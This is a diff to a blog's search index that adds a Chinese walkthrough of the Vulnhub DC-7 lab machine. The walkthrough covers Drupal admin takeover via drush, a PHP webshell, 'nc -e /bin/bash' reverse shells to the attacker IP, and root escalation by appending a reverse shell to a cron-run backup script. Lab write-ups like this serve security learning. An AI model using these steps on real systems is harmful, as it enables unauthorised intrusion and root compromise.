@@ -3166,7 +3166,7 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
   <entry>
     <title>Vulnhub-DC-6</title>
     <url>/2025/04/12/DC-6/</url>
-    <content><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>vulnhub 下载此靶机，下载地址如下：</p>
+    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>vulnhub 下载此靶机，下载地址如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.vulnhub.com/dc/DC-6.zip</span><br></pre></td></tr></table></figure>
 
 <p>将靶机设置为 NAT 模式，开机即可，配置说明如下：</p>
@@ -3237,6 +3237,63 @@ flag 值：flag{48ad0cde8345c8b2608933ac4e85147e}</p>
       <tags>
         <tag>WordPress</tag>
         <tag>sudo提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-7</title>
+    <url>/2025/04/20/DC-7/</url>
+    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>vulnhub 下载此靶机，下载地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.vulnhub.com/dc/DC-7.zip</span><br></pre></td></tr></table></figure>
+
+<p>将靶机设置为 NAT 模式，开机即可，配置说明如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机ip：192.168.52.128</span><br><span class="line">靶机ip：192.168.52.134</span><br></pre></td></tr></table></figure>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先使用 Nmap 的 Ping 扫描快速发现活跃主机，发现靶机 ip 为 192.168.52.134</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p>使用 Nmap 全面扫一下开放的端口和运行的服务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT -A -p1-65535 -T4 -O -sV 192.168.52.134</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：系统开放了一个 SSH 服务（7744 端口）、一个 HTTP 服务（80 端口）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/ </span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ </span><br><span class="line">| /user/password/ /user/login/ /user/logout/ /index.php/admin/ </span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br></pre></td></tr></table></figure>
+
+<h2 id="社工账密"><a href="#社工账密" class="headerlink" title="社工账密"></a>社工账密</h2><p>经过一系列信息收集和漏洞探测，均没有任何发现和漏洞。</p>
+<p>在网站底部有一个标识 @DC7USER，在 github 上搜一下找到项目源码。在 config.php 配置文件中找到一个账号密码</p>
+<p><img src="https://7.isyangs.cn/80/6805921f01f31-80.webp"></p>
+<p>网站后台尝试登陆失败，端口还扫到一个 ssh 端口，猜测 ssh 账密，成功登陆拿到 dc7user 用户权限</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="dc7user权限"><a href="#dc7user权限" class="headerlink" title="dc7user权限"></a>dc7user权限</h2><p>ssh 登陆后等待一会会收到一个提示 <code>You have new mail in /var/mail/dc7user</code></p>
+<p>查看该文件，发现是 dc7user 接收到的邮件，这些邮件都是由系统的 Cron Daemon（定时任务守护进程）发送的，报告了 <code>/opt/scripts/backups.sh</code> 脚本的执行结果。</p>
+<p><img src="https://7.isyangs.cn/80/680592209d0ec-80.webp"></p>
+<p>查看 <code>/opt/scripts/backups.sh</code> 文件的权限，文件时 root 权限用户创建的，www-data 组的用户可读可写可执行，其他用户不可写</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">ls</span> -al /opt/scripts/backups.sh</span><br><span class="line">-rwxrwxr-x 1 root www-data 556 Apr 16 00:46 /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>查看 <code>/opt/scripts/backups.sh</code> 文件的内容，是执行一些 shell 命令</p>
+<p><img src="https://7.isyangs.cn/80/6805921d84c08-80.webp"></p>
+<p>那么就有思路了，先拿到 www-data 权限，将反弹 shell 命令写入 backups.sh 文件，等待定时任务自动 以 root 权限执行，就能获得 root 权限的 shell</p>
+<h2 id="www-data权限"><a href="#www-data权限" class="headerlink" title="www-data权限"></a>www-data权限</h2><p>在网站目录使用如下 drush 命令更改网站后台密码为 admin，从而以账密 admin&#x2F;admin 进入后台</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">drush user-password admin --password=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以在页面直接写入 php 页面执行代码，但是由于 Drupal 8 不支持 PHP 代码，所以需要先安装插件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>安装完成后，导入插件并启用，然后在 Content 页面编辑页面，添加一句话木马，保存并刷新页面使一句话木马生效</p>
+<p><img src="https://7.isyangs.cn/80/680592210eb16-80.webp"></p>
+<p>然后使用蚁剑连接执行反弹 shell 命令，攻击机开启监听，即可拿到 www-data 权限的 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.52.128 2233</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/6805921d8ac1f-80.webp"></p>
+<p>www-data 对<code> /opt/scripts/backups.sh</code>文件具有写入权限，再将一个反弹 shell 命令写入文件，攻击机开启监听，等待定时任务执行即可拿到 root 权限的 shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.52.128 5566&quot;</span> &gt;&gt; /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://7.isyangs.cn/80/6805921ec3356-80.webp"></p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Drupal</tag>
+        <tag>社工</tag>
+        <tag>计划任务提权</tag>
       </tags>
   </entry>
 </search>
